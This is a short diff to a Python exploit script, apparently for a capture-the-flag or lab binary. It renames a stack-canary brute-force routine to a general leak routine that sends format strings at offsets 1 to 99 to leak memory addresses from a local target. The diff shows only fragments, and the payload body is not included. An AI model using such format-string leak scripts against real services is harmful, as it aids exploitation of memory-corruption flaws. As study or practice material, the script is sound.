@@ -27,7 +27,7 @@ class Exploit:
             self.multiprocess = False
     
     def send_format_str(self, num):
-        'sending format string to leak the stack canary'
+        'sending format string to leak the address'
         # num = 33
         with eval(self.p) as r:
             try:
@@ -39,7 +39,8 @@ class Exploit:
             except:
                 pass
             
-    def bruteforce_stack_canary(self):
+    def leaking(self):
+        '''start leaking...'''
         for i in range(1, 100):
             self.send_format_str(i)
             if self.multiprocess:
@@ -48,5 +49,5 @@ class Exploit:
                         if thread is not threading.current_thread():
                             thread.join()
 
-Exploit(local=True, multipocess=False).bruteforce_stack_canary()
+Exploit(local=True, multipocess=False).leaking()
 
